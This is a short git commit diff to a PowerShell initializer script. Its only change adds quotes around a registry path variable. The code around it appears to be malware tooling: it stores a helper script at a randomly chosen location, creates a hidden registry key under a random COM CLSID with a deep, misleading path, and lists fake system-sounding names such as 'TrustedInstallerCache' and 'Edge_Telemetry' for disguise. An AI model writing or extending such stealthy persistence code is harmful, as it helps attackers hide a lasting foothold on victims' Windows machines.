0f23fd409887a0a2f6a5cb1ceedcde998c430ef2
soumyo001 <www.soumyo@gmail.com>
2025-05-26 17:25:33 +0600

    testx20

--- initializers/initializer.ps1
+++ initializers/initializer.ps1
@@ -8,8 +8,8 @@ $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
 $basePath = "HKCU:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
-New-Item -Path $basePath -Force
-New-ItemProperty -Path $basePath -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
+New-Item -Path "$basePath" -Force
+New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
 $p = Get-Random -Count 5 -In (1..100)
 $score = Get-Random -Minimum 1 -Maximum 100
